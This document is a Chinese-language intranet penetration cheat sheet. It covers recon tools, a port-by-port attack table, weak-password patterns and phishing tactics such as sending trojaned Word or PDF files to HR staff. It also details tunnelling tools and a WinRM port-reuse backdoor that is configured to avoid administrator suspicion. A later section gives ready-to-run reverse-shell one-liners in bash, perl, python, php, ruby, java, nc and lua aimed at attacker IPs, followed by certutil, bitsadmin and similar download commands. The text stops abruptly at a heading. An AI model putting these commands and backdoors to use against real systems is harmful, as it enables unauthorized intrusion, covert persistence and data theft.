# 内网渗透TIPS

## 信息搜集

### 边界资产信息收集

![](https://wiki.wgpsec.org/images/infoscan.png)

#### Whois 聚合数据

微步在线：[https://x.threatbook.cn/](https://x.threatbook.cn/)

云悉指纹：[https://www.yunsee.cn/](https://www.yunsee.cn/)

#### 集团结构

天眼查：[https://www.tianyancha.com/](https://www.tianyancha.com/)

网站备案看有哪些主域名（或者改后缀可能也有其它域名）

收集子公司的名称和联系邮箱

#### 子域名（主公司/子公司）

**OneForAll \(一个就够了\)**

> [https://paper.seebug.org/1053/](https://paper.seebug.org/1053/) 帮助简介（把API、代理都配置好）

```bash
python3 oneforall.py --target example.com --port=80,443,8080,8009,7001 --valid=True --path=./subs.csv run

--port=PORT
请求验证子域的端口范围(默认只探测80端口)
--valid=VALID
只导出存活的子域结果(默认False)
--path=PATH
结果保存路径(默认None)
--takeover=TAKEOVER
检查子域接管(默认False)
```

**DNSdumpster**（在线）： [https://dnsdumpster.com/](https://dnsdumpster.com/)

历史DNS记录： [https://rapiddns.io/subdomain](https://rapiddns.io/subdomain)

#### CDN绕过（IP资产收集）

**确认CDN**

多地ping： [https://tools.ipip.net/httphead.php](https://tools.ipip.net/httphead.php)

CMD-ping看回复（IP前的域名有无CDN或WAF）

国外访问： [https://asm.ca.com/en/ping.php](https://asm.ca.com/en/ping.php) （针对小厂CDN，国外访问可能获得真实IP）

**绕过CDN**

注册查看邮件原文

用空间搜索引擎（**FOFA**：`title="公司名"`等特征 ）

通过查找到的子域名，辅助查找真实IP



**配置不当**

1、phpinfo

2、站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。

> 得知真实IP后，可以改host访问
>
> 在这里[https://www.ipip.net/ip.html](https://www.ipip.net/ip.html) 查询IP归属地，和目标公司匹配一下。

#### C段/旁站

将C段收集的相关IP，推测该单位所在的IP段，再针对IP段进行服务器端口扫描

利用FOFA空间搜索引擎（`title="xxx" && host="xxx.com"`）

**ASN码查询C段（大型企业才有）**

 [https://tools.ipip.net/as.php](https://tools.ipip.net/as.php) （在这输入IP查ASN码）

 [https://www.cidr-report.org/cgi-bin/as-report?as=AS37963](https://www.cidr-report.org/cgi-bin/as-report?as=AS37963) （查询ASN码对应的资产列表）

**旁站查询（IP反查域名）**

443 看证书、FOFA搜IP查域名

 [http://dns.bugscaner.com/](http://dns.bugscaner.com/)

 [https://site.ip138.com/](https://site.ip138.com/)

#### SRC 漏洞库

拿到子域的一些资产可以查找已公开漏洞，例如搜索`深信服VPN`

乌云镜像：[https://wooyun.x10sec.org/](https://wooyun.x10sec.org/)

#### Web指纹（网站架构）

> CMS框架、OS、脚本语言、中间件容器 （使用的版本是否存在历史漏洞）

相关工具：wappalyzer、云悉指纹等

#### 网站后台/敏感信息

网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取，可能存在一些敏感路径

> 备份文件、测试文件、Github泄露、SVN源码泄露
>
>  [https://github.com/maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)

```bash
python3 dirsearch.py -r -R 3 -s 3 -u <URL> -e *

--http-proxy=localhost:1080		#使用代理（也可以在配置文件设置）
-s DELAY, --delay=DELAY  	 	#设置请求之间的延时
-r -R 3							#递归扫描
```

#### JS敏感API接口

jsfinder（扫API和子域名）：[https://github.com/Threezh1/JSFinder](https://github.com/Threezh1/JSFinder)

```bash
python JSFinder.py -d -u http://www.mi.com
```

#### APP/微信小程序

通过移动端的程序，找到信息泄露、真实IP等，多端不同步等漏洞。

#### 端口服务扫描

对`1-65535`端口扫描，探测Web服务端口

```bash
sudo masscan -p 1-65535 139.224.94.40-139.224.94.50 --rate 4000	#只扫相关性高点的几个
sudo masscan -p 80,443 139.224.94.0/24 --rate 1000000	#全C段扫描
```

`masscan+nmap`结合扫描研究，速度和准确率的结合

[https://zhuanlan.zhihu.com/p/77656471](https://zhuanlan.zhihu.com/p/77656471)

### 常见端口服务渗透 <a id="&#x5E38;&#x89C1;&#x7AEF;&#x53E3;&#x670D;&#x52A1;&#x6E17;&#x900F;"></a>

| 端口号 | 端口说明 | 渗透思路 |
| :--- | :--- | :--- |
| 21/69 | FTP/TFTP：文件传输协议 | 爆破、内网嗅探 |
| 22 | SSH：远程连接 | 用户名枚举、爆破 |
| 23 | Telnet：远程连接 | 爆破、内网嗅探 |
| 25 | SMTP：邮件服务 | 邮件伪造 |
| 53 | DNS：域名系统 | DNS域传送\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙 |
| 389 | LDAP | 未授权访问（通过LdapBrowser工具直接连入） |
| 443 | https服务 | OpenSSL 心脏滴血（nmap -sV --script=ssl-heartbleed 目标） |
| 445 | SMB服务 | ms17\_010远程代码执行 |
| 873 | rsync服务 | 未授权访问 |
| 1090/1099 | Java-rmi | JAVA反序列化远程命令执行漏洞 |
| 1352 | Lotus Domino邮件服务 | 爆破：弱口令、信息泄漏：源代码 |
| 1433 | MSSQL | 注入、SA弱口令爆破、提权 |
| 1521 | Oracle | 注入、TNS爆破 |
| 2049 | NFS | 配置不当 |
| 2181 | ZooKeeper服务 | 未授权访问 |
| 3306 | MySQL | 注入、爆破、写shell、提权 |
| 3389 | RDP | 爆破、Shift后门、CVE-2019-0708远程代码执行 |
| 4848 | GlassFish控制台 | 爆破：控制台弱口令、认证绕过 |
| 5000 | Sybase/DB2数据库 | 爆破、注入 |
| 5432 | PostgreSQL | 爆破弱口令、高权限执行系统命令 |
| 5632 | PcAnywhere服务 | 爆破弱口令 |
| 5900 | VNC | 爆破：弱口令、认证绕过 |
| 6379 | Redis | 未授权访问、爆破弱口令 |
| 7001 | WebLogic中间件 | 反序列化、控制台弱口令+部署war包、SSRF |
| 8000 | jdwp | JDWP 远程命令执行漏洞（[工具](https://github.com/IOActive/jdwp-shellifier)） |
| 8080/8089 | Tomcat/JBoss/Resin/Jetty/Jenkins | 反序列化、控制台弱口令、未授权 |
| 8161 | ActiveMQ | admin/admin、任意文件写入、反序列化 |
| 8069 | Zabbix | 远程命令执行 |
| 9043 | WebSphere控制台 | 控制台弱口令[https://:9043/ibm/console/logon.jsp、远程代码执行](https://:9043/ibm/console/logon.jsp%E3%80%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C) |
| 9200/9300 | Elasticsearch服务 | 远程代码执行 |
| 11211 | Memcache | 未授权访问（nc -vv 目标 11211） |
| 27017 | MongoDB | 未授权访问、爆破弱口令 |
| 50000 | SAP | 远程代码执行 |
| 50070 | hadoop | 未授权访问 |

### 开源情报信息收集（OSINT）

**github**

* Github\_Nuggests（自动爬取Github上文件敏感信息泄露） :[https://github.com/az0ne/Github\_Nuggests](https://github.com/az0ne/Github_Nuggests)
* GSIL（能够实现近实时（15分钟内）的发现Github上泄露的信息） :[https://github.com/FeeiCN/GSIL](https://github.com/FeeiCN/GSIL)
* x-patrol\(小米团队的\):[https://github.com/MiSecurity/x-patrol](https://github.com/MiSecurity/x-patrol)

**whois查询/注册人反查/邮箱反查/相关资产**

* 站长之家:[http://whois.chinaz.com/?DomainName=target.com&ws=](http://whois.chinaz.com/?DomainName=target.com&ws=)
* 爱站:[https://whois.aizhan.com/target.com/](https://whois.aizhan.com/target.com/)
* 微步在线:[https://x.threatbook.cn/](https://x.threatbook.cn/)
* IP反查:[https://dns.aizhan.com/](https://dns.aizhan.com/)
* 天眼查:[https://www.tianyancha.com/](https://www.tianyancha.com/)
* 虎妈查:[http://www.whomx.com/](http://www.whomx.com/)
* 历史漏洞查询 :
  * 在线查询:[http://wy.zone.ci/](http://wy.zone.ci/)
  * 自搭建:[https://github.com/hanc00l/wooyun\_publi/](https://github.com/hanc00l/wooyun_publi/)

**google hacking**

### 创建企业密码字典

**字典列表**

* passwordlist:[https://github.com/lavalamp-/password-lists](https://github.com/lavalamp-/password-lists)
* 猪猪侠字典:[https://pan.baidu.com/s/1dFJyedz](https://pan.baidu.com/s/1dFJyedz) [Blasting\_dictionary](https://github.com/rootphantomer/Blasting_dictionary)（分享和收集各种字典，包括弱口令，常用密码，目录爆破。数据库爆破，编辑器爆破，后台爆破等）
* 针对特定的厂商，重点构造厂商相关域名的字典

```markup
['%pwd%123','%user%123','%user%521','%user%2017','%pwd%321','%pwd%521','%user%321','%pwd%123!','%pwd%123!@#','%pwd%1234','%user%2016','%user%123$%^','%user%123!@#','%pwd%2016','%pwd%2017','%pwd%1!','%pwd%2@','%pwd%3#','%pwd%123#@!','%pwd%12345','%pwd%123$%^','%pwd%!@#456','%pwd%123qwe','%pwd%qwe123','%pwd%qwe','%pwd%123456','%user%123#@!','%user%!@#456','%user%1234','%user%12345','%user%123456','%user%123!']
```

**密码生成**

* GenpAss（中国特色的弱口令生成器: [https://github.com/RicterZ/genpAss/](https://github.com/RicterZ/genpAss/)
* passmaker（可以自定义规则的密码字典生成器） ：[https://github.com/bit4woo/passmaker](https://github.com/bit4woo/passmaker)
* pydictor（强大的密码生成器） ：[https://github.com/LandGrey/pydictor](https://github.com/LandGrey/pydictor)

**邮箱列表获取**

* theHarvester ：[https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)
* 获取一个邮箱以后导出通讯录
* LinkedInt :[https://github.com/mdsecactivebreach/LinkedInt](https://github.com/mdsecactivebreach/LinkedInt)
* Mailget：[https://github.com/Ridter/Mailget](https://github.com/Ridter/Mailget)

**泄露密码查询**

* ghostproject: [https://ghostproject.fr/](https://ghostproject.fr/)
* pwndb: [https://pwndb2am4tzkvold.onion.to/](https://pwndb2am4tzkvold.onion.to/)

**对企业外部相关信息进行搜集**

**子域名获取**

* Layer子域名挖掘机4.2纪念版
* subDomainsBrute ：[https://github.com/lijiejie/subDomainsBrute](https://github.com/lijiejie/subDomainsBrute)
* wydomain ：[https://github.com/ring04h/wydomain](https://github.com/ring04h/wydomain)
* Sublist3r ：[https://github.com/aboul3la/Sublist3r](https://github.com/aboul3la/Sublist3r)
* site:target.com:[https://www.google.com](https://www.google.com)
* Github代码仓库
* 抓包分析请求返回值\(跳转/文件上传/app/api接口等\)
* 站长帮手links等在线查询网站
* 域传送漏洞

Linux

```bash
dig @ns.example.com example=.com AXFR 
```

Windows

```bash
nslookup -type=ns xxx.yyy.cn #查询解析某域名的DNS服务器
nslookup #进入nslookup交互模式
server dns.domian.com #指定dns服务器
ls xxx.yyy.cn #列出域信息
```

* GetDomainsBySSL.py :[https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a&type=note\#/](https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a&type=note#/)
* censys.io证书 :[https://censys.io/certificates?q=target.com](https://censys.io/certificates?q=target.com)
* crt.sh证书查询:[https://crt.sh/?q=%25.target.com](https://crt.sh/?q=%25.target.com)
* shadon :[https://www.shodan.io/](https://www.shodan.io/)
* zoomeye :[https://www.zoomeye.org/](https://www.zoomeye.org/)
* fofa :[https://fofa.so/](https://fofa.so/)
* censys：[https://censys.io/](https://censys.io/)
* dnsdb.io :[https://dnsdb.io/zh-cn/search?q=target.com](https://dnsdb.io/zh-cn/search?q=target.com)
* api.hackertarget.com :[http://api.hackertarget.com/reversedns/?q=target.com](http://api.hackertarget.com/reversedns/?q=target.com)
* community.riskiq.com :[https://community.riskiq.com/Search/target.com](https://community.riskiq.com/Search/target.com)
* subdomain3 :[https://github.com/yanxiu0614/subdomain3](https://github.com/yanxiu0614/subdomain3)
* FuzzDomain :[https://github.com/Chora10/FuzzDomain](https://github.com/Chora10/FuzzDomain)
* dnsdumpster.com :[https://dnsdumpster.com/](https://dnsdumpster.com/)
* phpinfo.me :[https://phpinfo.me/domain/](https://phpinfo.me/domain/)
* dns开放数据接口 :[https://dns.bufferover.run/dns?q=baidu.com](https://dns.bufferover.run/dns?q=baidu.com)

## 漏洞挖掘

### 漏洞挖掘步骤：

> （1）枚举程序入口点（GET-URL、POST数据、Cookie、HTTP消息头、带外通道）
>
> （2）思考可能出现的不安全状态（即漏洞）
>
> （3）设法使入口点到达不安全状态

**带外通道**

> 处理并显示通过SMTP接受到的电子邮件消息的Web邮件应用程序；
>
> 具有通过HTTP从其它服务器获取内容功能的发布应用程序\(SSRF、XML\)
>
> 记录数据或日志显示在Web页面的入侵检测系统；
>
> 提供的API接口

**从攻击面上来划分可以讲漏洞分为两大类，通用漏洞 和 上下文漏洞**

> **通用型漏洞**
>
> 是指在我们对应用的业务逻辑不是非常熟悉的情况下能够找出的漏洞；
>
> 例如一些RCE（远程代码执行）、SQLi、XSS、等。
>
> **上下文漏洞**
>
> 是指需要在对应用的业务逻辑、认证方式等非常熟悉的情况下才能找到的漏洞，例如权限绕过等。
>
> **漏洞的复杂性：**有时候需要多个漏洞一起结合利用

### OWASP Top10

> **1.注入：**SQL注入、OS注入\(命令执行\)、LDAP注入 **2.失效的身份认证和会话管理：**弱口令爆破、不安全的散列密码加密\(MD5爆破\) **3.敏感数据泄漏：**源码泄漏、配置文件暴露、www.zip备份文件、默认后台 **4.XML外部实体\(XXE\)** **5.失效的访问控制：**管理页面仅能管理员权限访问；越权漏洞\(垂直越权、水平越权\); JWT-Cookie伪造 **6.安全配置错误：**开放了不必要的功能\(445端口、网页-默认安装页面未删除、页面报错\)、默认密码或空密码 **7.跨站脚本\(XSS\)** **8.不安全的反序列化：**java、php、python **9.使用含有已知漏洞的组件：**未打补丁的系统和组件、使用有已知漏洞的框架版本 **10.不足的日志记录和监控：**代码被删除，日志被修改，无法溯源；应该记录登陆失败次数；监控问题没被管理员响应

### 渗透测试CheckList

![](https://wiki.wgpsec.org/images/image-20200802124213681.png)

![](https://wiki.wgpsec.org/images/image-20200802125146066.png)

![](https://wiki.wgpsec.org/images/image-20200802130517963.png)

> 这里并没有列全，反正就是各种Day去打就是了

### 漏洞扫描

**【AWVS爬虫 + Xray被动扫描】联动**

```bash
1、xray开启监听
./xray webscan --listen 0.0.0.0:1111 --html-output resualt.html

2、AWVS添加任务，走xray代理,选择Crawl Only即仅使用爬虫
```

### 任意文件读取（下载）

**JAVA站文件读取漏洞，下载网站源码工具**

 [https://github.com/LandGrey/ClassHound](https://github.com/LandGrey/ClassHound)

 [https://github.com/Artemis1029/Java\_xmlhack](https://github.com/Artemis1029/Java_xmlhack)

### 社工打点

邮件钓鱼

伪装求职者欺骗HR（传word或PDF马）

伪装客户欺骗销售（传木马）

伪装客户联系技术支持（获取系统密码）

## 进入内网

### 基于企业弱账号漏洞

* VPN（通过邮箱，密码爆破，社工等途径获取VPN）
* 企业相关运维系统（zabbix等）

### 基于系统漏洞进入

* Metasploit\(漏洞利用框架\):[https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)
* 漏洞利用脚本

### 网站应用程序渗透

* SQL注入
* 跨站脚本（XSS）
* 跨站请求伪造（CSRF）
* SSRF（[ssrf\_proxy](https://github.com/bcoles/ssrf_proxy)）
* 功能/业务逻辑漏洞
* 其他漏洞等
* CMS-内容管理系统漏洞
* 企业自建代理

### 无线Wi-Fi接入

## 隐匿攻击

### Command and Control

* ICMP :[https://pentestlab.blog/2017/07/28/command-and-control-icmp/](https://pentestlab.blog/2017/07/28/command-and-control-icmp/)
* DNS :[https://pentestlab.blog/2017/09/06/command-and-control-dns/](https://pentestlab.blog/2017/09/06/command-and-control-dns/)
* DropBox :[https://pentestlab.blog/2017/08/29/command-and-control-dropbox/](https://pentestlab.blog/2017/08/29/command-and-control-dropbox/)
* Gmail :[https://pentestlab.blog/2017/08/03/command-and-control-gmail/](https://pentestlab.blog/2017/08/03/command-and-control-gmail/)
* Telegram :[http://drops.xmd5.com/static/drops/tips-16142.html](http://drops.xmd5.com/static/drops/tips-16142.html)
* Twitter :[https://pentestlab.blog/2017/09/26/command-and-control-twitter/](https://pentestlab.blog/2017/09/26/command-and-control-twitter/)
* Website Keyword :[https://pentestlab.blog/2017/09/14/command-and-control-website-keyword/](https://pentestlab.blog/2017/09/14/command-and-control-website-keyword/)
* PowerShell :[https://pentestlab.blog/2017/08/19/command-and-control-powershell/](https://pentestlab.blog/2017/08/19/command-and-control-powershell/)
* Windows COM :[https://pentestlab.blog/2017/09/01/command-and-control-windows-com/](https://pentestlab.blog/2017/09/01/command-and-control-windows-com/)
* WebDAV :[https://pentestlab.blog/2017/09/12/command-and-control-webdav/](https://pentestlab.blog/2017/09/12/command-and-control-webdav/)
* Office 365 :[https://www.anquanke.com/post/id/86974](https://www.anquanke.com/post/id/86974)
* HTTPS :[https://pentestlab.blog/2017/10/04/command-and-control-https/](https://pentestlab.blog/2017/10/04/command-and-control-https/)
* Kernel :[https://pentestlab.blog/2017/10/02/command-and-control-kernel/](https://pentestlab.blog/2017/10/02/command-and-control-kernel/)
* Website :[https://pentestlab.blog/2017/11/14/command-and-control-website/](https://pentestlab.blog/2017/11/14/command-and-control-website/)
* WMI :[https://pentestlab.blog/2017/11/20/command-and-control-wmi/](https://pentestlab.blog/2017/11/20/command-and-control-wmi/)
* WebSocket :[https://pentestlab.blog/2017/12/06/command-and-control-websocket/](https://pentestlab.blog/2017/12/06/command-and-control-websocket/)
* Images :[https://pentestlab.blog/2018/01/02/command-and-control-images/](https://pentestlab.blog/2018/01/02/command-and-control-images/)
* Web Interface :[https://pentestlab.blog/2018/01/03/command-and-control-web-interface/](https://pentestlab.blog/2018/01/03/command-and-control-web-interface/)
* JavaScript :[https://pentestlab.blog/2018/01/08/command-and-control-javascript/](https://pentestlab.blog/2018/01/08/command-and-control-javascript/)
* ...

### Fronting

* [Domain Fronting](https://evi1cg.me/archives/Domain_Fronting.html)
* [Tor\_Fronting.](https://evi1cg.me/archives/Tor_Fronting.html)

### 代理

* VPN
* shadowsockts :[https://github.com/shadowsocks](https://github.com/shadowsocks)
* HTTP :[http://cn-proxy.com/](http://cn-proxy.com/)
* Tor

## 内网跨边界应用

### 构建通道漫游内网

#### 边界代理

**遵循三个原则**

1. **稳定性**（主要用于扫描）{ 支持高并发、自动断线重连 }
2. **安全性**（防止socks5直接被ban）{ 流量可加密、开放代理可设置认证 }
3. **健壮性** { 支持多种协议方式、最好支持插件定制 }

**推荐工具**

| 工具 | 优点 | 缺点 |
| :--- | :--- | :--- |
| [**Frp**](https://github.com/fatedier/frp) | 稳定、支持断线重连（大流量不断线） 支持将代理端口放在本地（跳板机只开个frp服务端口） | 配置复杂，体积偏大 |
| [**Nps**](https://github.com/ehang-io/nps) | 自带Web管理，一键启动 **多级代理友好** | 稳定性不如Frp 会在tmp生成文件 |

#### 端口转发（打17\_010等漏洞）

#### Windows netsh

`netsh`仅支持TCP协议， 适用于**双网卡**服务器， 连接外网6666端口，就是连接到内网目标上面的3389。

**启动转发**

```bash
#查看现有规则
netsh interface portproxy show all

#添加转发规则
netsh interface portproxy set v4tov4 listenaddress=外网IP listenport=6666 connectaddress=内网IP connectport=3389
```

**取消转发**

```bash
#删除转发规则
netsh interface portproxy delete v4tov4 listenport=6666

#xp需要安装ipv6
netsh interface ipv6 install
```

#### Linux SSH隧道（高权限用）

SSH一般是允许通过防火墙的，而且传输过程是加密的

> 测试环境如下图，VPS可访问Web服务器，但不能访问内网其它机器，Web服务器可访问内网其它机器。
>
> 目标：以Web服务器为跳板访问内网其它机器。

![](https://wiki.wgpsec.org/images/image-20200619231457834.png)

**本地转发**

在`VPS（黑客）`上执行以下命令

```bash
ssh -CfNg -L 1153（VPS端口）:10.1.1.3（目标主机）:3389（目标端口）
root@192.168.0.3（跳板机，Web服务器，会要求输入密码）

#查看1153端口是否已经连接
netstat -tulnp | grep "1153"

#连接目标数据库服务器的远程桌面
rdesktop 127.0.0.1:1153
```

SSH进程的本地端口映射，将本地端口转发到远端指定机器的指定端口；

本地端口转发是在本地监听一个端口，所有访问这个端口的流量都会通过SSH隧道传输到远端的对应端口。

**远程转发**

 在`Web服务器`上执行如下命令

```bash
ssh -CfNg -R 1122（VPS端口）:10.1.1.3（目标主机，数据库）:3389（目标端口） root@192.168.0.5(VPS的IP)
```

访问`VPS`的1122端口，即可连接内网数据库服务器的3389

```bash
rdesktop 127.0.0.1:1122
```

所有访问`VPS`的1122端口的流量都会通过SSH隧道传输到数据库服务器的3389端口

#### ICMP隧道

项目地址：[https://github.com/esrrhs/pingtunnel](https://github.com/esrrhs/pingtunnel)

适用场景 ：特殊环境下icmp流量允许出网

实现原理：客户端将TCP流量封装成icmp，然后发送给服务端，服务端再从ICMP包解析出正常TCP流量最后发向目标

![](https://wiki.wgpsec.org/images/image-20200613145026593.png)

#### iptables正向端口转发

1、编辑配置文件

```bash
vi /etc/sysctl.conf
	net.ipv4.ip_forward = 1#开启IP转发
```

2、关闭服务

```bash
service iptables stop
```

3、配置规则

```bash
#需要访问的内网地址：10.1.1.11（Windows）
#内网边界web服务器：192.168.100.100（Linux）
iptables -t nat -A PREROUTING --dst 192.168.100.100 -p tcp --dport 3389 -j DNAT--to-destination 10.1.1.11:3389

iptables -t nat -A POSTROUTING --dst 10.1.1.11 -p tcp --dport 3389 -j SNAT --to-source 192.168.100.100
```

4、保存并重启服务

```bash
service iptables save && service iptables start
```

这时访问Web服务器的3389就能登录到内网机器的桌面了。

#### 端口复用

> **适用场景**
>
> 需要占用一些已经开启的端口情况下（ server只对外开放指定端口，无法向外进行端口转发 、规避防火墙）
>
> 当前机器不出网不出网情况下，留正向后门

#### reGeorg 端口复用

> 网络情况：A只能连接B主机的80端口，A无法与C进行通信，且B无法与外网进行通信

项目地址： [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

reGeorg是一个Python2.7环境下开发的一款结合Webshell进行端口复用的工具；

能够将数据通过在本地建立的Socks服务转发到内网环境 ；

reGeorg需要配合Webshell使用，并且需要一个良好的网络状况，Python环境必须安装`Urlib3`

**创建Socks5代理**

```bash
python2 reGeorgSocksProxy.py -p <本地Socks5服务监听的端口> -u <Webshell地址>
python2 reGeorgSocksProxy.py -p 8888 -u http://xxx.com/shell.jsp
```

 之后使用浏览器设置Socks代理，就能访问内网主机的端口了，或者结合 Proxifier 连接 3389

#### HTTP.sys端口复用后门

> HTTP.sys驱动是IIS的主要组成部分，主要负责HTTP协议相关的处理，它有一个重要的功能叫**Port Sharing**，即端口共享；
>
>  所有基于HTTP.sys驱动的HTTP应用可以共享同一个端口，只需要各自注册的url前缀不一样即可；
>
>  使用Windows的远程管理服务WinRM，结合HTTP.sys驱动自带的端口复用功能，可实现端口复用后门

```bash
netsh http show servicestate	#查看所有在HTTP.sys上注册过的url前缀
```

**1、 开启WinRM服务**

WinRm使用端口：`http 5985、https 5986`

`Server 2012`及之后，已经默认开启WinRM并监听了`5985`端口

`Server 2008`及之前的系统

```bash
winrm quickconfig -q			#开启WinRM并自动从防火墙放行`5985`端口
```

**2、 Server 2012配置，新增80端口Listerner**

对于原本就开放了WinRM的机器（Server 2012），需要保留该端口，以免影响系统管理员正常使用

同时还需要新增一个80端口的Listener供攻击者使用

```bash
winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}

winrm e winrm/config/Listener	#查看80端口的Listener是否出现
netsh http show servicestate	#查看是否新增了url前缀
```

**3、Server 2008配置，修改WinRM端口**

对于原本未开放WinRM服务的机器（Server 2008），需要把新开的**5985**端口修改至80端口，避免引起系统管理员怀疑

```bash
winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}
```

**4、后门连接**

 首先开启本机WinRM服务，然后设置信任连接的主机

```bash
winrm quickconfig -q 	# 开启服务
winrm set winrm/config/Client @{TrustedHosts="*"}  # 设置信任连接的主机
```

 执行使用winrs命令连接远程WinRM服务，获取交互shell

```bash
winrs -r:http://www.baidu.com -u:administrator -p:P@ssw0rd cmd
```

端口复用相关工具： [https://github.com/Heart-Sky/port-multiplexing](https://github.com/Heart-Sky/port-multiplexing)

#### 参考连接

 [端口复用后门 - 0x4D75 - 博客园](https://www.cnblogs.com/0x4D75/p/11381449.html#%E4%B8%80-%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8)

### 内网跨边界转发

* [NC端口转发](https://blog.csdn.net/l_f0rm4t3d/article/details/24004555)
* [LCX端口转发](http://blog.chinaunix.net/uid-53401-id-4407931.html)
* [nps](https://github.com/cnlh/nps) -&gt; 个人用觉得比较稳定 ～
* [frp](https://github.com/fatedier/frp)
* 代理脚本
  1. [Tunna](https://github.com/SECFORCE/Tunna)
  2. [Reduh](https://github.com/sensepost/reDuh)
* ...

### 内网跨边界代理穿透

**EW**

正向 SOCKS v5 服务器:

```bash
./ew -s ssocksd -l 1080
```

反弹 SOCKS v5 服务器: a\) 先在一台具有公网 ip 的主机A上运行以下命令：

```bash
$ ./ew -s rcsocks -l 1080 -e 8888 

```

b\) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口

```text
$ ./ew -s rssocks -d 1.1.1.1 -e 8888 
```

多级级联

```text
$ ./ew -s lcx_listen -l 1080 -e 8888
$ ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999
$ ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999
```

lcx\_tran 的用法

```text
$ ./ew -s ssocksd -l 9999
$ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999
```

lcx\_listen、lcx\_slave 的用法

```text
$ ./ew -s lcx_listen -l 1080 -e 8888
$ ./ew -s ssocksd -l 9999
$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
```

“三级级联”的本地SOCKS测试用例以供参考

```text
$ ./ew -s rcsocks -l 1080 -e 8888
$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
$ ./ew -s lcx_listen -l 9999 -e 7777
$ ./ew -s rssocks -d 127.0.0.1 -e 7777
```

**Termite**

使用说明:[https://rootkiter.com/Termite/README.txt](https://rootkiter.com/Termite/README.txt)

**代理脚本**

reGeorg :[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

### shell反弹

bash

```text
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

perl

```text
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

php

```text
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

ruby

```text
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

java

```text
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

nc

```text
#使用-e 
nc -e /bin/sh 223.8.200.234 1234 
```

```text
#不使用-e
mknod /tmp/backpipe p
/bin/sh 0/tmp/backpipe | nc attackerip listenport 1>/tmp/backpipe
```

lua

```text
lua -e "require('socket');require('os');t=socket.tcp();t:connect('202.103.243.122','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

### 内网文件的传输和下载



wput

```text
wput dir_name ftp://linuxpig:123456@host.com/
```

wget

```text
wget http://site.com/1.rar -O 1.rar
```

ariac2（需安装）

```text
aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2
```

powershell

```text
$p = New-Object System.Net.WebClient 
$p.DownloadFile("http://domain/file","C:%homepath%file") 
```

vbs脚本

```text
Set args = Wscript.Arguments
Url = "http://domain/file"
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", Url, False
xHttp.Send
with bStrm
.type = 1 '
.open
.write xHttp.responseBody
.savetofile " C:\%homepath%\file", 2 '
end with
```

> 执行 ：cscript test.vbs

Perl

```text
#!/usr/bin/perl 
use LWP::Simple; 
getstore("http://domain/file", "file");
```

> 执行：perl test.pl

Python

```text
#!/usr/bin/python 
import urllib2 
u = urllib2.urlopen('http://domain/file') 
localFile = open('local_file', 'w') 
localFile.write(u.read()) 
localFile.close()
```

> 执行：python test.py

Ruby

```text
#!/usr/bin/ruby
require 'net/http'
Net::HTTP.start("www.domain.com") { |http|
r = http.get("/file")
open("save_location", "wb") { |file|
file.write(r.body)
}
}
```

> 执行：ruby test.rb

PHP

```text
<?php
$url  = 'http://www.example.com/file';
$path = '/path/to/file';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$data = curl_exec($ch);
curl_close($ch);
file_put_contents($path, $data);
?>
```

> 执行：php test.php

NC attacker

```text
cat file | nc -l 1234
```

target

```text
nc host_ip 1234 > file
```

FTP

```text
ftp 127.0.0.1 username password get file exit
```

TFTP

```text
tftp -i host GET C:%homepath%file location_of_file_on_tftp_server
```

Bitsadmin

```text
bitsadmin /transfer n http://domain/file c:%homepath%file
```

Window 文件共享

```text
net use x: \127.0.0.1\share /user:example.comuserID myPassword
```

SCP 本地到远程

```text
scp file user@host.com:/tmp
```

远程到本地

```text
scp user@host.com:/tmp file
```

rsync 远程rsync服务器中拷贝文件到本地机

```text
rsync -av root@192.168.78.192::www /databack
```

本地机器拷贝文件到远程rsync服务器

```text
rsync -av /databack root@192.168.78.192::www
```

certutil.exe

```text
certutil.exe -urlcache -split -f http://site.com/file
```

copy

```text
copy \\IP\ShareName\file.exe file.exe
```

WHOIS 接收端 Host B：

```text
